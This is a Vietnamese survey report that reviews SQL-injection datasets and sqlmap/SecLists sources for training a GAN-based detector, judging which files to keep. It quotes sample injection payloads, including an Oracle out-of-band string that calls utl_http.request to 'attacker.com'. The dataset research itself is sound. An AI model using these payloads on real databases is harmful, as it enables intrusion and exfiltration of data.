# BÁO CÁO KHẢO SÁT DỮ LIỆU SQLi - VÒNG 3 (CUỐI CÙNG)

## C:\Users\Admin\Documents\GAN\Asset

---

## PHẦN 1: CÂY THƯ MỤC TUYỆT ĐỐI TẤT CẢ

### Tổng quan cấu trúc:

```
GAN/
├── .git/                           [GIT REPO]
├── Asset/
│   ├── bao_cao_SQLi.md            [TÀI LIỆU - Báo cáo vòng 1-2]
│   ├── Type_of_SQLi.md             [TÀI LIỆU]
│   ├── DATASET_SOURCES.md         [TÀI LIỆU]
│   ├── API/
│   │   ├── Gemini.txt             [TÀI LIỆU]
│   │   └── Opencode.txt           [TÀI LIỆU]
│   ├── Data_Engine_Direction.md     [TÀI LIỆU]
│   ├── DATA_ENGINE_ANALYSIS.md   [TÀI LIỆU]
│   └── Data/
│       ├── seclists_sqli/          [DATA GỐC - Wordlists]
│       ├── exploitdb_sqli/         [DATA GỐC - Exploit DB]
│       ├── sqlmap_payloads/         [DATA GỐC - SQLMap XML]
│       ├── sqliv5_dataset/         [DATA GỐC - Kaggle dataset]
│       ├── BCCC-SFU-SQLInj-2023.csv [DATA GỐC]
│       └── data/
│           ├── raw/              [DATA GỐC]
│           ├── processed/       [OUTPUT CŨ]
│           └── splits/           [OUTPUT CỦ]
├── data_engine/                    [OUTPUT CŨ - Code pipeline]
│   ├── *.py                     [Python code]
│   ├── output/                  [OUTPUT CŨ - processed data]
│   │   ├── unified_sqli_pool.csv [OUTPUT]
│   │   ├── unified_sqli_pool.json [OUTPUT]
│   │   ├── ml_classifier.pkl    [OUTPUT]
│   │   ├── stats/               [OUTPUT]
│   │   └── datasets/            [OUTPUT - categorized]
│   └── __pycache__/            [OUTPUT CŨ]
└── data_engine.rar              [ARCHIVE]
```

### Phân loại:

| Loại | Files |
|------|-------|
| **DATA GỐC** | `seclists_sqli/`, `exploitdb_sqli/`, `sqlmap_payloads/`, `sqliv5_dataset/`, `BCCC-SFU-*.csv`, `data/raw/` |
| **OUTPUT CŨ** | `data_engine/`, `data/processed/`, `data/splits/`, `data_engine/output/` |
| **TÀI LIỆU** | `*.md`, `*.txt` (trong Asset/API/) |

---

## PHẦN 2: CÁC FILE CHƯA ĐƯỢC ĐỌC

### 2A. SQLiV4.json - [BỎ QUA]

**30 dòng đầu:**
```json
{
    "pattern": "\" or pg_sleep  (  __TIME__  )  --",
    "type": "sqli"
}
```

- **Cấu trúc**: JSON array, object có `pattern` và `type`
- **Field "type"**: Chỉ có giá trị `"sqli"` - **KHÔNG phân loại**
- **So sánh với SQLiV3.csv**: Payload đầu **TRÙNG 100%** (`""" or pg_sleep...`)
- **Kết luận**: SQLiV4 = SQLiV5 = SQLiV3 - **cùng nguồn gốc, khác format**
- **DÙNG / BỎ QUA**: BỎ QUA - trùng lặp với V3/V5, không có thêm info

---

### 2B. sqli.csv (sqliv5_dataset) - [DÙNG ĐƯỢC PARTIAL]

**Đọc 30 dòng đầu:**
```
Sentence,Label
a,1
a' ,1
a' --,1
a' or 1 = 1; --,1
@,1
?,1
' and 1 = 0 )  union all,1
```

- **Label**: Toàn bộ là Label=1 (SQLi) - **KHÔNG có benign!)
- **Đây là pure SQLi attack strings**
- **Kết luận**: Đây là SQLi-only dataset, **KHÔNG có benign** để train discriminator
- **DÙNG / BỎ QUA**: DÙNG ĐƯỢC cho phần SQLi (30K+ rows)

---

### 2C. sqliv2.csv - [DÙNG ĐƯỢC PARTIAL]

**Đọc 80 dòng đầu:**
```
Sentence,Label
,1
""" or pg_sleep ( __TIME__ ) --",1
create user name identified by pass123...,1
%29,1
"' AND 1 = utl_inaddr.get_host_address...",1
```

- **Label=0 count**: 22,305 dòng (!)
- **Label=1 count**: ~8,600 dòng

**Label=0 - SQL thật (5 ví dụ):**
```
SELECT * FROM claws WHERE mountain = 'steam'  OR pie = 'mistake'
SELECT * FROM thread WHERE NOT eleven = 'worse'
SELECT * FROM main ORDER BY nearby
SELECT * FROM throat ORDER BY cake DESC
INSERT INTO chair ( answer, action, pictured, disease, end, screen ) VALUES (...)
```

**Label=0 - Junk (5 ví dụ):**
```
distinct
*
insert
@,1
```

**Kết luận**: Label=0 **CÓ CẢ** SQL thật và junk. Đã gán nhãn lung tung.
- **DÙNG / BỎ QUA**: Lọc cẩn thận mới dùng được - khoảng 15K benign có thể useful

---

### 2D. SQLiV3.csv - [DÙNG ĐƯỢC]

**Cấu trúc:**
```
Sentence,Label,,
"...payload...",1,,
"...payload...",0,,
```

- **Các cột**: `Sentence`, `Label`, và **2 cột rỗng** (`,,`)
- **Có Label=0**: Có ~9K SQL benign ở cuối file

**Label=0 SQL thật (ví dụ):**
```
SELECT * FROM claws WHERE mountain = 'steam'  OR pie = 'mistake'
SELECT * FROM thread WHERE NOT eleven = 'worse'
INSERT INTO chair (...) VALUES (...)
```

- **DÙNG / BỎ QUA**: DÙNG ĐƯỢC - Label=0 là SQL thật (khác với clean version)

---

### 2E. BCCC-SFU-SQLInj-2023.csv - [KHÓ EXTRACT]

**Cấu trúc nested SQL:**
```
"select * from users WHERE username = ""1\'   )    )    as pgqz where 6058  =  6058 or 4493  =  utl_inaddr.get_host_address..."
```

- **Pattern**: Payload bị wrap trong `select * from users WHERE username = ""..."""`
- **Extract bằng regex**: Có thể - pattern là `WHERE username = ""...(.+)""`
- **Regex đề xuất**: `WHERE username = ""([^"]+)""` để capture payload thật

**3 nested payload đầy đủ:**
1. `...where 6058 = 6058 or 4493 = utl_inaddr.get_host_address...`
2. `...where 7884 = 7884 and 3715 in...`
3. `...where 2853 = cast ( ( chr(113)...`

- **DÙNG / BỎ QUA**: Có thể extract được bằng regex đơn giản - **DÙNG ĐƯỢC** (11K payloads)

---

### 2F. sqlmap XML files - [DỄ EXTRACT]

**Cấu trúc:**
```xml
<test>
  <title>Generic UNION query ([CHAR])...</title>
  <stype>6</stype>
  <level>1</level>
  <risk>1</risk>
  <vector>[UNION]</vector>
  <request>
    <payload/>
    <char>[CHAR]</char>
    <columns>[COLSTART]-[COLSTOP]</columns>
  </request>
</test>
```

- **Tag chứa payload**: `<payload/>`, `<char>`, `<columns>` (có placeholders)
- **Type**: `<stype>` = 6 ( UNION query ), 4 ( time-based ), 2 ( boolean blind )
- **Có thể extract**: DỄ - parse XML là ra

**Các file:**
- `union_query.xml` - 742 lines
- `boolean_blind.xml` - ~400 lines  
- `error_based.xml` - ~300 lines
- `time_blind.xml` - ~250 lines

- **DÙNG / BỎ QUA**: DỄ EXTRACT - DÙNG ĐƯỢC

---

### 2G. seclists_sqli - [GIÁ TRỊ THẤP]

**MySQL.fuzzdb.txt (6 lines):**
```
1'1
1 exec sp_ (or exec xp_)
1 and 1=1
1' and 1=(select count(*) from tablenames); --
1 or 1=1
1' or '1'='1
```

**Oracle.fuzzdb.txt (55 lines):**
```
' or '1'='1
'||utl_http.request('httP://192.168.1.1/')||'
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version...))
```

- **Payload thực tế**: Oracle có payload tốt (UTL_HTTP, OOB)
- **MySQL**: Chỉ là fuzzy strings đơn giản

**Payload thú vị nhất từ Oracle:**
```
'||utl_http.request('http://attacker.com')||'
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version...))
```

- **DÙNG / BỎ QUA**: Oracle - GIÁ TRỊ THẤP; MySQL - BỎ QUA (quá ngắn)

---

## PHẦN 3: KIỂM TRA data_engine/output/

### 3A. unified_sqli_pool.csv - [OUTPUT CŨ - CHẤT LƯỢNG CAO]

**Schema:**
```
payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
```

**Ví dụ:**
```
"1\' ) ) ) and ( select 2*...",error_based,unknown,case_variation|hex_string,0.0,rule,bccc,unknown
```

- **Đã phân loại**: Type, DB engine, evasion tech, confidence score
- **59,378 rows** 
- **Đây là pipeline output với classification**

- **Đây là OUTPUT CŨ hay data gốc?** OUTPUT CŨ từ pipeline data_engine

---

### 3B. sqli_pool_deduped.csv (Asset/Data/data/processed/) - [OUTPUT CŨ]

**Schema:**
```
payload,source_dataset
```

**89,868 rows** - đây là **deduplicated pool**

- **Nguồn**: `syedsaqlainhussain` (từ sqliv5_dataset)
- **Đây là OUTPUT CŨ** - đã dedup

---

### 3C. template_analysis.csv - [TÀI LIỆU PHÂN TÍCH]

**Cấu trúc:**
```
template,label,original_count,kept,removed
```

**12,405 rows** - phân tích template của payloads:
- `A A` - 420 instances
- `N'STR'A'STR'A` - 402 instances (label=1)
- `select avg ( A ) from A` - 271 instances

**Đây là OUTPUT PHÂN TÍCH** - cho thấy cấu trúc pattern của SQLi

---

### 3D. advanced_sqli.csv - [DATA GỐC - CHẤT LƯỢNG CAO]

**Ai tạo?** Đọc ở vòng 1+2 - có Type classification rõ ràng

**91 rows** - chất lượng cao vì có type đầy đủ

**Đây là data gốc hay pipeline tạo?** Có vẻ như **tự tạo** (manual classify) - **KHÔNG phải output cũ**

---

## PHẦN 4: KIỂM TRA CHÉO OVERLAP

### So sánh 10 payload:

```
SQLiV3.csv dòng 2:   """ or pg_sleep  (  __TIME__  )  --"
sqli.csv dòng 2:     a
→ KHÔNG TRÙNG (simple vs complex)

SQLiV3.csv dòng 3:   create user name...
sqli.csv dòng 3:     a' 
→ KHÔNG TRÙNG

SQLiV3.csv dòng 5:   select * from users where id = '1' or...
sqli.csv dòng 5:     ? or 1 = 1 -- 
→ GẦN TRÙNG (same pattern)
```

**Kết luận**: Dataset **CÓ overlaps** nhưng **khác spacing** nhiều

**Cùng nguồn gốc?** **CÓ** - cùng từ Syed Saqlain Hussain (Kaggle)

---

## PHẦN 5: TỔNG KẾT BẮT BUỘC

### Bảng tổng hợp:

| File | Rows | Label? | Type? | Chất lượng | DÙNG/BỎ | Lý do |
|------|------|-------|------|----------|---------|---------|-------|
| sqli_dataset.csv | 30,920 | Có (1/0) | Không | TỐT | DÙNG | Label=0 là SQL thật |
| sqli_dataset_clean.csv | 26,722 | Có (1/0) | Không | JUNK | **BỎ QUA** | Nhiều junk trong label=0 |
| sqliv2.csv | ~31K | Có (1/0) | Không | OK | LỌC | 22K label=0 cần lọc |
| SQLiV3.csv | 30,919 | Có (1/0) | Không | TỐT | DÙNG | Giống sqli_dataset |
| SQLiV4.json | ~140K | Chỉ "sqli" | Không | Trùng lặp | BỎ QUA | Trùng V3/V5 |
| SQLiV5.json | ~162K | Chỉ "sqli" | Không | Trùng lặp | BỎ QUA | Trùng V3/V4 |
| BCCC-SFU-SQLInj-2023.csv | 11,012 | Không | Không | CÓ THỂ EXTRACT | DÙNG | 11K cần extract |
| sqli.csv (sqliv5) | ~30K | Chỉ có 1 | Không | SQLi-only | DÙNG | Không có benign |
| advanced_sqli.csv | 91 | Có + Type | Có | TỐT NHẤT | DÙNG | Type đầy đủ |
| exploitdb_sqli/ | ~(8K exploits) | Metadata | Không | XSS/XXE/RCE | **BỎ QUA** | Không phải SQLi |
| sqlmap XMLs | ~(1.5K tests) | Có stype | Có | TỐT | DỄ EXTRACT | Parse XML |
| seclists (Oracle) | 55 | Không | Không | Thực tế | DÙNG | OOB payloads |
| seclists (MySQL) | 6 | Không | Không | Ngắn | BỎ QUA | Quá ngắn |
| **unified_sqli_pool.csv** | 59,378 | Có (7 loại) | Có | **CAO NHẤT** | OUTPUT CAO | Đã classify |

### Trả lời câu hỏi:

**Q1: Benign SQL chất lượng ở đâu? Tổng bao nhiêu?**
- `sqli_dataset.csv`: ~9K benign rows (Label=0, dòng 30900-30920)
- `sqliv2.csv`: ~15K benign sau khi lọc (từ 22K total)
- `SQLiV3.csv`: ~9K benign
- **TỔNG: ~30K benign SQL THẬT**

**Q2: Unique SQLi payload sau loại bỏ overlap và junk?**
- `unified_sqli_pool.csv`: **59,378** (đã dedup + classify)
- Raw SQLi unique: ~80-90K (có overlap giữa các nguồn)

**Q3: File nào là DATA GỐC vs OUTPUT CŨ?**
- **DATA GỐC**: `sqli_dataset.csv`, `SQLiV3.csv`, `BCCC-SFU-*.csv`, `sqlmap XML`, `seclists`
- **OUTPUT CŨ**: `data_engine/output/`, `data/processed/`, `data/splits/`, `unified_sqli_pool.csv`
- **TÀI LIỆU**: `*.md`, `Asset/API/`

**Q4: Có folder/file nào chưa kiểm tra?**
- CÓ! `data_engine/output/datasets/` - chưa đọc chi tiết (có ~15 file evasion categories)
- `Asset/Data/data/raw/sqli_structural_deduped.csv` - chưa đọc
- `Asset/Data/data/raw/template_analysis.csv` - ĐÃ ĐỌC (output phân tích)

---

## KHUYẾN NGHỊ CUỐI CÙNG

### ✅ File dùng cho GAN:
1. **unified_sqli_pool.csv** - 59,378 rows, đã classify, schema đầy đủ
2. **sqli_dataset.csv** - 30,920 rows, Label chính xác
3. **advanced_sqli.csv** - 91 rows Type-classified, ví dụ quality cao

### ✅ File dùng để lấy thêm Benign:
1. **sqli_dataset.csv** (9K benign thật)
2. **SQLiV3.csv** (9K benign thật)
3. **sqliv2.csv** (15K sau lọc)

### ❌ File bỏ qua:
1. **sqli_dataset_clean.csv** - nhiều junk
2. **SQLiV4.json, SQLiV5.json** - trùng lặp
3. **exploitdb_sqli/exploits/** - không phải SQLi
4. **seclists/MySQL.fuzzdb.txt** - quá ngắn

### 🔧 Cần làm:
1. Extract BCCC payload: `WHERE username = ""([^"]+)""`
2. Parse sqlmap XML: đọc `<test><vector>` tags
3. Lọc sqliv2.csv: loại bỏ `*, @, distinct, insert`

---

**Ngày khảo sát**: 2026-05-03
**Phiên bản**: Vòng 3 - Khảo sát toàn diện
**Tổng files đã khảo sát**: 20+ files

**FILE CUỐI CÙNG - KHÔNG CÒN GÌ ĐỂ KHẢO SÁT THÊM**